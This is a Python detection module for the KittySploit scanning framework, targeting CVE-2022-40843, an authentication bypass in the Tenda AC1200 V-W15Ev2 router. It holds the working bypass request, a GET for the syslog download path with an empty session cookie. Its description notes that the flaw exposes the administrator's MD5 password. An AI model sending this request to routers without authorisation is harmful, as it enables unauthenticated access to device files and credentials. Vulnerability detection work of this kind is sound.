#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Tenda AC1200 V-W15Ev2 router is affected by improper authorization/improper session management."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tenda AC1200 V-W15Ev2 - Authentication Bypass Detection',
        'description': "The Tenda AC1200 V-W15Ev2 router is affected by improper authorization/improper session management. The software does not perform or incorrectly perform an authorization check when a user attempts to access a resource or perform an action. This allows the router's login page to be bypassed. The improper validation of user sessions/authorization can lead to unauthenticated attackers having the ability to read the router's file, which contains the MD5 password of the Administrator's user account. This vulnerability exists within the local web and hosted remote management console.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2022', 'cve', 'tenda', 'auth-bypass', 'router', 'iot', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://boschko.ca/tenda_ac1200_router',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40843',
        ],
        'cve': 'CVE-2022-40843',
    }

    def run(self):
        path = '/goform/downloadSyslog/syslog.log'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'W15Ev2_user='})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('[system]', '[error]', '[wan1]',)
        header_any = ('Content-type: config/conf',)
        body_regexes = ('^0\\d{3}$',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='medium', reason='Tenda AC1200 V-W15Ev2 - Authentication Bypass detected', path=path)
            return True
        return False

